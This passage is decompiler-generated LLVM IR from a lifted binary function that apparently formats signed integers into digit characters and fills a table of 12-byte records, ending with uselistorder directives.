  %v3_1000d220 = icmp eq i32 %v0_1000d220, 103
  store i1 %v1_1000d220, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d220, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d220, label %dec_label_pc_1000d250, label %dec_label_pc_1000d228

dec_label_pc_1000d228:                            ; preds = %dec_label_pc_1000d220
  %v0_1000d228 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d228 = icmp slt i32 %v0_1000d228, 0
  %v3_1000d228 = icmp eq i32 %v0_1000d228, 0
  store i1 %v1_1000d228, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d228, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000d228, 1
  br i1 %tmp79, label %dec_label_pc_1000d250, label %dec_label_pc_1000d230

dec_label_pc_1000d230:                            ; preds = %dec_label_pc_1000d218, %dec_label_pc_1000d20c, %dec_label_pc_1000d228
  %v2_1000d238 = inttoptr i32 %v1_1000d238 to i32*
  store i32 112, i32* %v2_1000d238, align 4
  store i32 ptrtoint (i32* @global_var_100138a0.649 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000d244 = load i32, i32* @r8, align 4
  %v2_1000d244 = add i32 %v1_1000d244, 8
  %v3_1000d244 = inttoptr i32 %v2_1000d244 to i32*
  store i32 ptrtoint (i32* @global_var_100138a0.649 to i32), i32* %v3_1000d244, align 4
  %v0_1000d248 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d248 = load i32, i32* @r8, align 4
  %v2_1000d248 = add i32 %v1_1000d248, 4
  %v3_1000d248 = inttoptr i32 %v2_1000d248 to i32*
  store i32 %v0_1000d248, i32* %v3_1000d248, align 4
  %v0_1000d24c = load i32, i32* @r8, align 4
  %v1_1000d24c = add i32 %v0_1000d24c, 12
  store i32 %v1_1000d24c, i32* @r8, align 4
  br label %dec_label_pc_1000d250

dec_label_pc_1000d250:                            ; preds = %dec_label_pc_1000d228, %dec_label_pc_1000d220, %dec_label_pc_1000d230
  %v1_1000d260 = phi i32 [ %v1_1000d238, %dec_label_pc_1000d228 ], [ %v1_1000d238, %dec_label_pc_1000d220 ], [ %v1_1000d24c, %dec_label_pc_1000d230 ]
  %v0_1000d250 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d250 = add i32 %v0_1000d250, 1
  store i32 %v1_1000d250, i32* %r10.global-to-local, align 4
  %v4_1000d250 = icmp eq i32 %v1_1000d250, 0
  br i1 %v4_1000d250, label %dec_label_pc_1000d278, label %dec_label_pc_1000d258

dec_label_pc_1000d258:                            ; preds = %dec_label_pc_1000d250
  %v1_1000d258 = sub i32 -1, %v0_1000d250
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d260 = add i32 %v1_1000d260, 4
  %v3_1000d260 = inttoptr i32 %v2_1000d260 to i32*
  store i32 %v1_1000d258, i32* %v3_1000d260, align 4
  store i32 ptrtoint (i32* @global_var_10013893.648 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d26c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d26c = load i32, i32* @r8, align 4
  %v2_1000d26c = inttoptr i32 %v1_1000d26c to i32*
  store i32 %v0_1000d26c, i32* %v2_1000d26c, align 4
  %v0_1000d270 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d270 = load i32, i32* @r8, align 4
  %v2_1000d270 = add i32 %v1_1000d270, 8
  %v3_1000d270 = inttoptr i32 %v2_1000d270 to i32*
  store i32 %v0_1000d270, i32* %v3_1000d270, align 4
  %v0_1000d274 = load i32, i32* @r8, align 4
  %v1_1000d274 = add i32 %v0_1000d274, 12
  store i32 %v1_1000d274, i32* @r8, align 4
  br label %dec_label_pc_1000d278

dec_label_pc_1000d278:                            ; preds = %dec_label_pc_1000d250, %dec_label_pc_1000d258
  %v1_1000d284 = phi i32 [ %v1_1000d260, %dec_label_pc_1000d250 ], [ %v1_1000d274, %dec_label_pc_1000d258 ]
  %v0_1000d278 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d278 = icmp slt i32 %v0_1000d278, 0
  %v3_1000d278 = icmp eq i32 %v0_1000d278, 0
  store i1 %v1_1000d278, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d278, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d278, label %dec_label_pc_1000d294, label %dec_label_pc_1000d280

dec_label_pc_1000d280:                            ; preds = %dec_label_pc_1000d278
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000d284 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d284 = add i32 %v1_1000d284, 8
  %v3_1000d284 = inttoptr i32 %v2_1000d284 to i32*
  store i32 %v0_1000d284, i32* %v3_1000d284, align 4
  %v0_1000d288 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d288 = load i32, i32* @r8, align 4
  %v2_1000d288 = inttoptr i32 %v1_1000d288 to i32*
  store i32 %v0_1000d288, i32* %v2_1000d288, align 4
  %v0_1000d28c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d28c = load i32, i32* @r8, align 4
  %v2_1000d28c = add i32 %v1_1000d28c, 4
  %v3_1000d28c = inttoptr i32 %v2_1000d28c to i32*
  store i32 %v0_1000d28c, i32* %v3_1000d28c, align 4
  %v0_1000d290 = load i32, i32* @r8, align 4
  %v1_1000d290 = add i32 %v0_1000d290, 12
  store i32 %v1_1000d290, i32* @r8, align 4
  br label %dec_label_pc_1000d294

dec_label_pc_1000d294:                            ; preds = %dec_label_pc_1000d278, %dec_label_pc_1000d280
  %v1_1000d2bc = phi i32 [ %v1_1000d284, %dec_label_pc_1000d278 ], [ %v1_1000d290, %dec_label_pc_1000d280 ]
  %v0_1000d294 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d294 = icmp slt i32 %v0_1000d294, 103
  %v3_1000d294 = icmp eq i32 %v0_1000d294, 103
  store i1 %v1_1000d294, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d294, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d294, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d2a8

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d294
  %v3_1000d29c = load i32, i32* %v2_1000cddc, align 4
  store i32 %v3_1000d29c, i32* %r0.global-to-local, align 4
  %v1_1000d2a0 = and i32 %v3_1000d29c, 16
  store i32 %v1_1000d2a0, i32* %r9.global-to-local, align 4
  %v3_1000d2a0 = icmp eq i32 %v1_1000d2a0, 0
  br i1 %v3_1000d2a0, label %dec_label_pc_1000d2d4, label %dec_label_pc_1000d2a8

dec_label_pc_1000d2a8:                            ; preds = %dec_label_pc_1000d294, %dec_label_pc_1000d29c
  %v0_1000d2a8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d2a8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d2a8 = sub i32 %v1_1000d2a8, %v0_1000d2a8
  store i32 %v2_1000d2a8, i32* %r9.global-to-local, align 4
  %v1_1000d2ac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d2ac = icmp sgt i32 %v1_1000d2ac, %v2_1000d2a8
  %v4_1000d2ac = icmp eq i32 %v1_1000d2ac, %v2_1000d2a8
  store i1 %v2_1000d2ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d2ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000d2ac, label %dec_label_pc_1000d2b4, label %dec_label_pc_1000d2d4

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d2a8
  %v2_1000d2b4 = sub i32 %v1_1000d2ac, %v2_1000d2a8
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d2bc = add i32 %v1_1000d2bc, 4
  %v3_1000d2bc = inttoptr i32 %v2_1000d2bc to i32*
  store i32 %v2_1000d2b4, i32* %v3_1000d2bc, align 4
  store i32 ptrtoint (i32* @global_var_10013893.648 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d2c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d2c8 = load i32, i32* @r8, align 4
  %v2_1000d2c8 = inttoptr i32 %v1_1000d2c8 to i32*
  store i32 %v0_1000d2c8, i32* %v2_1000d2c8, align 4
  %v0_1000d2cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d2cc = load i32, i32* @r8, align 4
  %v2_1000d2cc = add i32 %v1_1000d2cc, 8
  %v3_1000d2cc = inttoptr i32 %v2_1000d2cc to i32*
  store i32 %v0_1000d2cc, i32* %v3_1000d2cc, align 4
  %v0_1000d2d0 = load i32, i32* @r8, align 4
  %v1_1000d2d0 = add i32 %v0_1000d2d0, 12
  store i32 %v1_1000d2d0, i32* @r8, align 4
  br label %dec_label_pc_1000d2d4

dec_label_pc_1000d2d4:                            ; preds = %dec_label_pc_1000d2a8, %dec_label_pc_1000d29c, %dec_label_pc_1000d2b4
  %v1_1000d36837 = phi i32 [ %v1_1000d2bc, %dec_label_pc_1000d2a8 ], [ %v1_1000d2bc, %dec_label_pc_1000d29c ], [ %v1_1000d2d0, %dec_label_pc_1000d2b4 ]
  %v0_1000d2d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d2d4 = icmp slt i32 %v0_1000d2d4, 102
  %v3_1000d2d4 = icmp eq i32 %v0_1000d2d4, 102
  store i1 %v1_1000d2d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d2d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d2d4, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d2dc

dec_label_pc_1000d2dc:                            ; preds = %dec_label_pc_1000d2d4
  %v0_1000d2dc = load i32, i32* @r7, align 4
  %v1_1000d2dc = icmp slt i32 %v0_1000d2dc, 0
  %v3_1000d2dc = icmp eq i32 %v0_1000d2dc, 0
  store i1 %v1_1000d2dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d2dc, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d2dc, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000d2dc, -1
  br i1 %tmp80, label %dec_label_pc_1000d2f8, label %dec_label_pc_1000d2f0

dec_label_pc_1000d2f0:                            ; preds = %dec_label_pc_1000d2dc
  %v1_1000d2f0 = sub i32 0, %v0_1000d2dc
  store i32 %v1_1000d2f0, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d2f8

dec_label_pc_1000d2f8:                            ; preds = %dec_label_pc_1000d2dc, %dec_label_pc_1000d2f0
  %v0_1000d30c31 = phi i32 [ %v0_1000d2dc, %dec_label_pc_1000d2dc ], [ %v1_1000d2f0, %dec_label_pc_1000d2f0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000d2fc = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000d2fc, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000d30c

dec_label_pc_1000d30c:                            ; preds = %dec_label_pc_1000d30c.backedge, %dec_label_pc_1000d2f8
  %v2_1000d32c = phi i32 [ %v3_1000d32c, %dec_label_pc_1000d30c.backedge ], [ %v2_1000d2fc, %dec_label_pc_1000d2f8 ]
  %v0_1000d310 = phi i32 [ %v0_1000d310.pre, %dec_label_pc_1000d30c.backedge ], [ 2, %dec_label_pc_1000d2f8 ]
  %v1_1000d30c = phi i32 [ %v1_1000d30c.pre, %dec_label_pc_1000d30c.backedge ], [ 10, %dec_label_pc_1000d2f8 ]
  %v1_1000d320 = phi i32 [ %v0_1000d30c.pre, %dec_label_pc_1000d30c.backedge ], [ %v0_1000d30c31, %dec_label_pc_1000d2f8 ]
  %v2_1000d30c = sdiv i32 %v1_1000d320, %v1_1000d30c
  store i32 %v2_1000d30c, i32* %r0.global-to-local, align 4
  %v1_1000d310 = add i32 %v0_1000d310, 1
  store i32 %v1_1000d310, i32* @r7, align 4
  %v1_1000d314 = icmp slt i32 %v1_1000d310, 3
  %v3_1000d314 = icmp eq i32 %v1_1000d310, 3
  store i1 %v1_1000d314, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d314, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d31c = icmp slt i32 %v2_1000d30c, 0
  %v2_1000d31c = icmp sgt i32 %v2_1000d30c, 0
  %v3_1000d31c = icmp eq i32 %v2_1000d30c, 0
  store i1 %v1_1000d31c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d31c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d31c, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000d30c, -10
  store i32 %v2_1000d30c, i32* %r11.global-to-local, align 4
  %v2_1000d320 = add i32 %v1_1000d320, 48
  %v1_1000d328 = add i32 %v2_1000d320, %tmp81
  store i32 %v1_1000d328, i32* %r9.global-to-local, align 4
  %v1_1000d32c = trunc i32 %v1_1000d328 to i8
  %v3_1000d32c = add i32 %v2_1000d32c, -1
  %v4_1000d32c = inttoptr i32 %v3_1000d32c to i8*
  store i8 %v1_1000d32c, i8* %v4_1000d32c, align 1
  store i32 %v3_1000d32c, i32* %r10.global-to-local, align 4
  %v0_1000d330 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d330 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000d330 = or i1 %v0_1000d330, %v1_1000d330
  br i1 %v2_1000d330, label %dec_label_pc_1000d30c.backedge, label %dec_label_pc_1000d334

dec_label_pc_1000d30c.backedge:                   ; preds = %dec_label_pc_1000d30c, %dec_label_pc_1000d334
  %v0_1000d30c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d30c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000d310.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d30c

dec_label_pc_1000d334:                            ; preds = %dec_label_pc_1000d30c
  %v0_1000d334 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000d334, label %dec_label_pc_1000d338, label %dec_label_pc_1000d30c.backedge

dec_label_pc_1000d338:                            ; preds = %dec_label_pc_1000d334
  %v1_1000d338 = add i32 %v2_1000d32c, -2
  store i32 %v1_1000d338, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000d340 = add i32 %v2_1000d32c, -3
  store i32 %v1_1000d340, i32* %r11.global-to-local, align 4
  %v0_1000d344 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d344 = trunc i32 %v0_1000d344 to i8
  %v4_1000d344 = inttoptr i32 %v1_1000d338 to i8*
  store i8 %v1_1000d344, i8* %v4_1000d344, align 1
  %v0_1000d348 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d348 = trunc i32 %v0_1000d348 to i8
  %v2_1000d348 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d348 = add i32 %v2_1000d348, -1
  %v4_1000d348 = inttoptr i32 %v3_1000d348 to i8*
  store i8 %v1_1000d348, i8* %v4_1000d348, align 1
  %v0_1000d34c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d34c = load i32, i32* @r8, align 4
  %v2_1000d34c = inttoptr i32 %v1_1000d34c to i32*
  store i32 %v0_1000d34c, i32* %v2_1000d34c, align 4
  %v0_1000d350 = load i32, i32* @r7, align 4
  %v1_1000d350 = load i32, i32* @r8, align 4
  %v2_1000d350 = add i32 %v1_1000d350, 4
  %v3_1000d350 = inttoptr i32 %v2_1000d350 to i32*
  store i32 %v0_1000d350, i32* %v3_1000d350, align 4
  %v0_1000d354 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d354 = load i32, i32* @r8, align 4
  %v2_1000d354 = add i32 %v1_1000d354, 8
  %v3_1000d354 = inttoptr i32 %v2_1000d354 to i32*
  store i32 %v0_1000d354, i32* %v3_1000d354, align 4
  %v0_1000d358 = load i32, i32* @r8, align 4
  %v1_1000d358 = add i32 %v0_1000d358, 12
  store i32 %v1_1000d358, i32* @r8, align 4
  br label %dec_label_pc_1000d35c

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d2d4, %dec_label_pc_1000ceb0, %dec_label_pc_1000d338
  %v0_1000d3d8 = phi i32 [ %v1_1000d36837, %dec_label_pc_1000d2d4 ], [ %v2_1000cebc, %dec_label_pc_1000ceb0 ], [ %v1_1000d358, %dec_label_pc_1000d338 ]
  %v2_1000d35c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000d35c, i32* %r9.global-to-local, align 4
  %v1_1000d36c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d360

dec_label_pc_1000d360:                            ; preds = %dec_label_pc_1000d360, %dec_label_pc_1000d35c
  %v1_1000d36c = phi i32 [ %v2_1000d36c, %dec_label_pc_1000d360 ], [ %v1_1000d36c.pre, %dec_label_pc_1000d35c ]
  %v0_1000d360 = phi i32 [ %v1_1000d364, %dec_label_pc_1000d360 ], [ %v2_1000d35c, %dec_label_pc_1000d35c ]
  %v1_1000d360 = inttoptr i32 %v0_1000d360 to i32*
  %v2_1000d360 = load i32, i32* %v1_1000d360, align 4
  store i32 %v2_1000d360, i32* %r0.global-to-local, align 4
  %v1_1000d364 = add i32 %v0_1000d360, 12
  store i32 %v1_1000d364, i32* %r9.global-to-local, align 4
  %v2_1000d368 = icmp ult i32 %v1_1000d364, %v0_1000d3d8
  %v2_1000d36c = sub i32 %v1_1000d36c, %v2_1000d360
  store i32 %v2_1000d36c, i32* @r28, align 4
  br i1 %v2_1000d368, label %dec_label_pc_1000d360, label %dec_label_pc_1000d374

dec_label_pc_1000d374:                            ; preds = %dec_label_pc_1000d360
  %v4_1000d368 = icmp eq i32 %v1_1000d364, %v0_1000d3d8
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d368, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d374 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000d3d8, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000d374, 0
  %v1_1000d388 = zext i1 %tmp85 to i32
  store i32 %v1_1000d388, i32* %r9.global-to-local, align 4
  %v2_1000d38c = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000d38c, i32* %r0.global-to-local, align 4
  %v2_1000d390 = sub i32 %v2_1000d36c, %v1_1000d388
  store i32 %v2_1000d390, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000d390, 1
  br i1 %tmp82, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d3a0

dec_label_pc_1000d3a0:                            ; preds = %dec_label_pc_1000d374
  %v3_1000d3a0 = load i32, i32* %v2_1000cddc, align 4
  store i32 %v3_1000d3a0, i32* %r0.global-to-local, align 4
  %v1_1000d3a4 = and i32 %v3_1000d3a0, 8
  store i32 %v1_1000d3a4, i32* @r7, align 4
  %v3_1000d3a4 = icmp eq i32 %v1_1000d3a4, 0
  br i1 %v3_1000d3a4, label %dec_label_pc_1000d3c8, label %dec_label_pc_1000d3ac

dec_label_pc_1000d3ac:                            ; preds = %dec_label_pc_1000d3a0
  %v1_1000d3b0 = add i32 %v0_1000d3d8, 12
  store i32 %v1_1000d3b0, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10013893.648 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d3b8 = inttoptr i32 %v0_1000d3d8 to i32*
  store i32 160, i32* %v2_1000d3b8, align 4
  %v0_1000d3bc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d3bc = load i32, i32* @r8, align 4
  %v2_1000d3bc = add i32 %v1_1000d3bc, 4
  %v3_1000d3bc = inttoptr i32 %v2_1000d3bc to i32*
  store i32 %v0_1000d3bc, i32* %v3_1000d3bc, align 4
  %v0_1000d3c0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3c0 = load i32, i32* @r8, align 4
  %v2_1000d3c0 = add i32 %v1_1000d3c0, 8
  %v3_1000d3c0 = inttoptr i32 %v2_1000d3c0 to i32*
  store i32 %v0_1000d3c0, i32* %v3_1000d3c0, align 4
  br label %dec_label_pc_1000d3fc

dec_label_pc_1000d3c8:                            ; preds = %dec_label_pc_1000d3a0
  %v1_1000d3c8 = add i32 %tmp, 16
  %v2_1000d3c8 = inttoptr i32 %v1_1000d3c8 to i32*
  %v3_1000d3c8 = load i32, i32* %v2_1000d3c8, align 4
  store i32 %v3_1000d3c8, i32* %r0.global-to-local, align 4
  %v1_1000d3cc = icmp slt i32 %v3_1000d3c8, 48
  %v3_1000d3cc = icmp eq i32 %v3_1000d3c8, 48
  store i1 %v1_1000d3cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d3cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d3cc, label %dec_label_pc_1000d3d4, label %dec_label_pc_1000d3f0

dec_label_pc_1000d3d4:                            ; preds = %dec_label_pc_1000d3c8
  %v3_1000d3d4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000d3d8, i32* @r30, align 4
  %v2_1000d3dc = add i32 %v3_1000d3d4, %v2_1000d390
  store i32 %v2_1000d3dc, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d3dc, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000d3fc

dec_label_pc_1000d3e8:                            ; preds = %dec_label_pc_1000d404
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000d438

dec_label_pc_1000d3f0:                            ; preds = %dec_label_pc_1000d3c8
  store i32 %v2_1000d36c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d3d8, i32* @r30, align 4
  br label %dec_label_pc_1000d3fc

dec_label_pc_1000d3fc:                            ; preds = %dec_label_pc_1000d374, %dec_label_pc_1000d3d4, %dec_label_pc_1000d3ac, %dec_label_pc_1000d3f0
  store i32 0, i32* @r29, align 4
  %v2_1000d400 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000d400, i32* @r31, align 4
  br label %dec_label_pc_1000d404

dec_label_pc_1000d404:                            ; preds = %dec_label_pc_1000d434, %dec_label_pc_1000d3fc
  %v0_1000d414 = phi i32 [ %v1_1000d420, %dec_label_pc_1000d434 ], [ %v2_1000d400, %dec_label_pc_1000d3fc ]
  %v1_1000d404 = inttoptr i32 %v0_1000d414 to i32*
  %v2_1000d404 = load i32, i32* %v1_1000d404, align 4
  store i32 %v2_1000d404, i32* %r4.global-to-local, align 4
  %v0_1000d408 = load i32, i32* @r27, align 4
  store i32 %v0_1000d408, i32* %r3.global-to-local, align 4
  %v1_1000d40c = add i32 %v0_1000d414, 4
  %v2_1000d40c = inttoptr i32 %v1_1000d40c to i32*
  %v3_1000d40c = load i32, i32* %v2_1000d40c, align 4
  store i32 %v3_1000d40c, i32* %r5.global-to-local, align 4
  %v0_1000d410 = load i32, i32* @r26, align 4
  store i32 %v0_1000d410, i32* %ctr.global-to-local, align 4
  %v1_1000d414 = add i32 %v0_1000d414, 8
  %v2_1000d414 = inttoptr i32 %v1_1000d414 to i32*
  %v3_1000d414 = load i32, i32* %v2_1000d414, align 4
  store i32 %v3_1000d414, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d410)
  %v0_1000d41c = load i32, i32* @r31, align 4
  %v1_1000d41c = add i32 %v0_1000d41c, 4
  %v2_1000d41c = inttoptr i32 %v1_1000d41c to i32*
  %v3_1000d41c = load i32, i32* %v2_1000d41c, align 4
  store i32 %v3_1000d41c, i32* %r0.global-to-local, align 4
  %v1_1000d420 = add i32 %v0_1000d41c, 12
  store i32 %v1_1000d420, i32* @r31, align 4
  %v0_1000d424 = load i32, i32* @r29, align 4
  %v1_1000d424 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000d424 = add i32 %v1_1000d424, %v0_1000d424
  store i32 %v2_1000d424, i32* @r29, align 4
  %v2_1000d428 = icmp slt i32 %v1_1000d424, %v3_1000d41c
  %v4_1000d428 = icmp eq i32 %v1_1000d424, %v3_1000d41c
  store i1 %v2_1000d428, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d428, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d42c = load i32, i32* @r30, align 4
  %v2_1000d42c = icmp ult i32 %v1_1000d420, %v1_1000d42c
  %v3_1000d42c = icmp ugt i32 %v1_1000d420, %v1_1000d42c
  %v4_1000d42c = icmp eq i32 %v1_1000d420, %v1_1000d42c
  store i1 %v2_1000d42c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000d42c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000d42c, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000d428, label %dec_label_pc_1000d434, label %dec_label_pc_1000d3e8

dec_label_pc_1000d434:                            ; preds = %dec_label_pc_1000d404
  br i1 %v2_1000d42c, label %dec_label_pc_1000d404, label %dec_label_pc_1000d438

dec_label_pc_1000d438:                            ; preds = %dec_label_pc_1000d434, %dec_label_pc_1000d3e8
  %v0_1000d43c = phi i32 [ -1, %dec_label_pc_1000d3e8 ], [ %v2_1000d424, %dec_label_pc_1000d434 ]
  store i32 %v0_1000cd8c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d43c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d43c

; uselistorder directives
  uselistorder i32 %v0_1000d43c, { 1, 0 }
  uselistorder i32 %v1_1000d424, { 2, 1, 0 }
  uselistorder i32 %v1_1000d420, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000d41c, { 1, 0, 2 }
  uselistorder i32 %v0_1000d414, { 0, 2, 1 }
  uselistorder i32 %v3_1000d3c8, { 1, 0, 2 }
  uselistorder i32 %v1_1000d388, { 1, 0 }
  uselistorder i32 %v2_1000d36c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d364, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d360, { 1, 0 }
  uselistorder i32 %v0_1000d3d8, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000d32c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d310, { 1, 0, 2 }
  uselistorder i32 %v2_1000d30c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000d2dc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000d2ac, { 2, 0, 1 }
  uselistorder i32 %v2_1000d2a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000d218, { 1, 0 }
  uselistorder i32 %v2_1000d17c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000d150, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d118, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000d110, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000d0dc, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000d0cc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000d0c0, { 1, 0, 2 }
  uselistorder i32 %v1_1000d0a4, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000d05c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000d04c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000d030, { 1, 0 }
  uselistorder i32 %v1_1000d00c, { 1, 0 }
  uselistorder i32 %v2_1000cfec, { 1, 0, 2 }
  uselistorder i32 %v0_1000cf94, { 1, 0 }
  uselistorder i32 %v1_1000cdf8, { 1, 0 }
  uselistorder i32 %v0_1000ce84, { 2, 1, 0 }
  uselistorder i32 %v1_1000cdcc, { 1, 0 }
  uselistorder i32 %v1_1000cdac, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 1, 4, 2, 3, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
